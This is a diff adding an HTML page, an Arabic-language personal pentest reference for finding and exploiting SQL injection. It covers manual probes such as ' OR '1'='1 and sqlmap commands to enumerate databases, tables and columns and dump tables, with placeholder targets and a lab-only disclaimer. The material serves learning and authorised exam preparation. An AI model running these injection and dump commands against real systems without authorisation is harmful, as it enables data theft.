@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<title>MySQL / MSSQL / SQL Injection — من الفحص إلى الاستغلال</title>
+<style>
+:root{
+  --bg:#0b0b0b; --panel:#141414; --panel-2:#1a1a1a; --border:#2b2b2b;
+  --gold:#d4af37; --gold-dim:#8a712a; --yellow:#e8c547;
+  --text:#e9e6da; --text-dim:#a19c8c; --mono:#f2e6b8;
+  --green:#7fae4a; --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:"Tahoma","Segoe UI",sans-serif;margin:0;padding:0 0 4rem;line-height:1.7;}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:1.2rem;position:relative;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;white-space:pre-wrap;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">WEB APPLICATION — SQL INJECTION / SQLMAP</span>
+<h1>SQL Injection / sqlmap — Web SQL Injection Workflow</h1>
+<p>مرجع مستقل لاختبار SQL Injection عبر sqlmap بدون خلطه بخدمات قواعد البيانات المباشرة.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote"><b>النطاق:</b> هذا الملف لتطبيقات الويب وsqlmap فقط. MySQL وMSSQL لهما ملفات مستقلة.</div>
+<div class="toc"><span class="ttl">الفهرس</span><ol><li><a href="#s1">Identify Suspected Input</a></li><li><a href="#s2">Manual Confirmation</a></li><li><a href="#s3">Capture Request</a></li><li><a href="#s4">SQLMap Detection</a></li><li><a href="#s5">Enumeration</a></li><li><a href="#s6">Extraction</a></li></ol></div><div class="stage" id="s1"><h2>1. Identify Suspected Input</h2><p class="desc">ابدأ بالـparameter أو الحقل الذي يتغير مع إدخال المستخدم قبل تشغيل أي Automation.</p><div class="step"><div class="step-title">GET parameter <span class="where">BROWSER / BURP</span></div><div class="cmd">https://[TARGET]/page.php?id=[INPUT]</div><div class="note">غيّر قيمة parameter واحدًا في كل مرة وراقب هل يتغير الرد.</div></div><div class="step"><div class="step-title">POST / Form field <span class="where">BURP SUITE</span></div><div class="cmd">POST /login-or-form
+[PARAMETER]=[INPUT]</div><div class="note">التقط الطلب الحقيقي كي تعرف أسماء الحقول والطريقة المستخدمة.</div></div></div><div class="stage" id="s2"><h2>2. Manual Confirmation</h2><p class="desc">اختبارات بسيطة لتحديد هل الإدخال قد يصل إلى استعلام SQL. لا تعتبر أي Payload دليلًا وحده.</p><div class="step"><div class="step-title">اختبار Quotes <span class="where">BROWSER / BURP</span></div><div class="cmd">'
+"</div><div class="note">GENERAL REFERENCE — ابحث عن SQL error، اختلاف واضح في الصفحة، تغير status/length، أو behavior غير طبيعي. ظهور Error وحده مؤشر يحتاج تأكيد وليس إثباتًا نهائيًا.</div></div><div class="step"><div class="step-title">Boolean behavior <span class="where">BROWSER / BURP</span></div><div class="cmd">' OR '1'='1</div><div class="note">GENERAL REFERENCE — قارن رد True condition برد False condition. اختلاف ثابت وقابل للتكرار أقوى من مجرد ظهور صفحة مختلفة مرة واحدة.</div></div><div class="danger">GENERAL REFERENCE — فشل Payload يدوي واحد لا ينفي SQL Injection؛ السياق ونوع قاعدة البيانات وطريقة بناء الاستعلام تؤثر على الاختبار.</div></div><div class="stage" id="s3"><h2>3. Capture Request</h2><p class="desc">إذا كان الطلب POST أو يحتاج Cookies/Headers، احفظه من Burp واستخدمه كما هو.</p><div class="step"><div class="step-title">حفظ الطلب <span class="where">BURP SUITE</span></div><div class="cmd">Proxy / Repeater → Save request as [REQUEST_FILE]</div></div><div class="step"><div class="step-title">تمرير الطلب إلى sqlmap <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -r [REQUEST_FILE] -p [PARAMETER]</div></div></div><div class="stage" id="s4"><h2>4. SQLMap Detection</h2><p class="desc">بعد وجود input مشتبه، شغّل Detection على URL أو request محفوظ.</p><div class="step"><div class="step-title">GET / URL <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -u "[URL]" -p [PARAMETER]</div><div class="result">GENERAL REFERENCE — النجاح = sqlmap يحدد Parameter قابلًا للحقن ويعرض نوع التقنية/DBMS عندما يستطيع تحديدها.</div></div><div class="step"><div class="step-title">Request محفوظ <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -r [REQUEST_FILE] -p [PARAMETER]</div><div class="result">GENERAL REFERENCE — النجاح = sqlmap يحدد Parameter قابلًا للحقن ويعرض نوع التقنية/DBMS عندما يستطيع تحديدها.</div></div></div><div class="stage" id="s5"><h2>5. Enumeration</h2><p class="desc">وسّع فقط بعد أن يؤكد sqlmap أن parameter قابل للحقن.</p><div class="step"><div class="step-title">قواعد البيانات <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -u "[URL]" -p [PARAMETER] --dbs</div><div class="result">GENERAL REFERENCE — النجاح = ظهور أسماء Databases المتاحة للحساب الحالي.</div></div><div class="step"><div class="step-title">الجداول <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -u "[URL]" -p [PARAMETER] -D [DATABASE] --tables</div><div class="result">GENERAL REFERENCE — النجاح = ظهور Tables للـDatabase المحددة.</div></div><div class="step"><div class="step-title">الأعمدة <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -u "[URL]" -p [PARAMETER] -D [DATABASE] -T [TABLE] --columns</div><div class="result">GENERAL REFERENCE — النجاح = ظهور Columns للـTable المحدد.</div></div></div><div class="stage" id="s6"><h2>6. Extraction</h2><p class="desc">استخرج فقط البيانات المطلوبة في اللاب بعد تحديد قاعدة البيانات والجدول.</p><div class="step"><div class="step-title">Dump جدول محدد <span class="where">KALI TERMINAL</span></div><div class="cmd">sqlmap -u "[URL]" -p [PARAMETER] -D [DATABASE] -T [TABLE] --dump</div><div class="note">لا تضف bypass/evasion تلقائيًا؛ ابدأ بأبسط مسار يثبت النتيجة.</div><div class="result">GENERAL REFERENCE — النجاح = استخراج Rows يملك الحساب صلاحية قراءتها.</div></div></div><footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div>
+</body>
+</html>
